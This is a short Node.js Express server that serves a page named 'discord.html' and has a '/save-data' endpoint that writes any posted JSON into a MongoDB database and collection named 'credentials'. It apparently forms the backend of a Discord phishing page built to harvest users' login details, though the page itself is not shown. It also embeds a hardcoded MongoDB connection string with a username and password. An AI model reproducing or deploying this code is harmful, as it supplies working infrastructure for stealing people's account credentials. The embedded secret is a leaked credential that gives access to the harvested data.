const express = require("express");
const bodyParser = require("body-parser");
const { MongoClient } = require("mongodb");
const path = require("path");

const app = express();
const port = 4200;

app.use(bodyParser.json());
app.use(express.static("public"));

const uri = "mongodb+srv://copy:hehelol@@credentials.pxrplms.mongodb.net/?retryWrites=true&w=majority&appName=credentials";
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });

app.get("/", (req, res) => {
	res.sendFile(path.join(__dirname, "public", "discord.html"));
});

app.post("/save-data", async (req, res) => {
	try {
		await client.connect();
		const database = client.db("credentials");
		const collection = database.collection("data");

		const data = req.body;

		await collection.insertOne(data);

		res.send("Data saved successfully");
	} catch (err) {
		console.error("Error saving data to MongoDB:", err);
		res.status(500).send("Error saving data");
	} finally {
		await client.close();
	}
});

app.listen(port, () => {
	console.log(`✅ Server is running on http://localhost:${port}`);
});
